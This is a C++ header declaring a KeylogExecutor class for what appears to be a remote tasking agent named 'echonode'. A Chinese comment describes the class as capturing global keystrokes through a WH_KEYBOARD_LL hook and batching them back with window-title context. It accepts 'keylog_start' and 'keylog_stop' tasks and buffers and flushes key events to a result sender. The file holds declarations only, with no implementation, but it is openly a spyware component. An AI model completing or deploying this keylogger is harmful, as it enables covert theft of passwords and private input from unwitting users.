// 键盘记录执行器：WH_KEYBOARD_LL 钩子捕获全局键盘输入，按窗口标题上下文批量回传
#pragma once
#include "IExecutor.hpp"

#include <atomic>
#include <cstdint>
#include <functional>
#include <mutex>
#include <string>
#include <thread>
#include <vector>

namespace echonode::executor {

    class KeylogExecutor : public IExecutor {
    public:
        using ResultSender = std::function<void(const protocol::TaskResult&)>;

        void setResultSender(ResultSender sender) { resultSender_ = std::move(sender); }

        std::vector<std::string> actions() const override { return {"keylog_start", "keylog_stop"}; }

        protocol::TaskResult execute(protocol::Task task) override;
        ~KeylogExecutor() override;

        // 供平台钩子回调线程调用（public 因为 WH_KEYBOARD_LL 回调无法访问 private）
        void pushKeyEvent(const std::string& key, int64_t ts);

    private:
        struct KeyEvent {
            std::string key;
            int64_t ts;
        };

        void startCapture(const std::string& taskId);
        void stopCapture();
        void flush();

        ResultSender resultSender_;
        std::thread worker_;
        std::thread flusher_;
        std::atomic<bool> capturing_{false};    // 回传线程的运行标志
        std::atomic<uint32_t> hookThreadId_{0}; // Windows 线程 id，用于投递 WM_QUIT
        std::string taskId_;
        std::mutex mtx_;
        std::vector<KeyEvent> buffer_;
    };

} // namespace echonode::executor
